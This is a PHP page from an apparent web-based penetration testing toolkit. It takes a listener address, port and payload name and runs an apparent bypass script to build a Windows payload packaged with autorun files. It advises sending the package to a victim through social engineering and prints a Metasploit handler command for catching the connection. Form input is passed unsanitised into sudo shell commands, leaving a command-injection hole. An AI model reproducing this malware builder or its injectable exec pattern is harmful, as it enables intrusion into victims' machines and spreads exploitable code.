<?php /***************************************************************************
 Copyright (C) 2014 Rakesh Pandey
 Written by Rakesh Pandey <rakeshpandey@karunya.edu.in>.
 
 This file is part of Penetration Testing Toolkit, a web interface for various ethical hacking tools.
 
 Penetration Testing Toolkit is free software; you can redistribute it and/or modify it 
 under the terms of the GNU General Public License as published by the Free
 Software Foundation; either version 2 of the License, or (at your option)
 any later version. 

 Penetration Testing Toolkit is distributed in the hope that it will be useful, but WITHOUT 
 ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
 FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for 
 more details.

 You should have received a copy of the GNU General Public License along
 with Penetration Testing Toolkit; if not, write to the Free Software Foundation, Inc.,
 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.
***************************************************************************/?>
<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Welcome to the Web Based Penetration Testing Toolkit.</h4>
		<div class="clear"></div>
		
              
                                         
     <?php
               
                if(isset($_POST['submit']))
                {
                    $ip=$_POST['ip'];
                    $port=$_POST['port'];
                        $pkg=$_POST['pkg'];
                        $c=$_POST['c'];
                        $s=$_POST['s'];
              
               if($ip==''||$port==''){
                   
                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered datas correctly...'});</script>";
              }
               
 else {
      
                require_once 'loading.php';
                 echo "<fieldset>";
                  
                  shell("echo '[Wait] While i generate your payload....'");
                    
                           shell("sudo sh cmd/bypass.sh $c $ip $port autorun/$pkg $s");
                           exec("sudo cp autorun/$pkg exploits/$pkg && sudo chmod +x  exploits/$pkg");
                          exec("sudo zip exploits/$pkg.zip autorun/autorun.ico autorun/autorun.inf autorun/$pkg ");
                           exec("sudo rm -rf autorun/*");
                           
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
echo '<p><b>PAYLOAD</b>                   -->'.$c.'</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format along with autorun files@</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Windows OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E'; 
$host=$_SERVER['SERVER_ADDR'];
	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";

echo '</fieldset>';                     
               
                    echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : '".$pkg. "Generated Successfully!Please refer result section after this message'});</script>";
        
        
         
         echo '</div>
                                    <footer>
				<div align="left">
					
					<h3>Thank You!</h3>
                                        
				</div>
			</footer>
		</article><!-- end of styles article -->
                 <h4 class="alert_success">Scan Succeeded </h4>
                 
 ';
         
 }
               
 }            
                     
    
                
 ?>
                </fieldset>
		<div class="spacer"></div>
	</section>
</body>
</html>

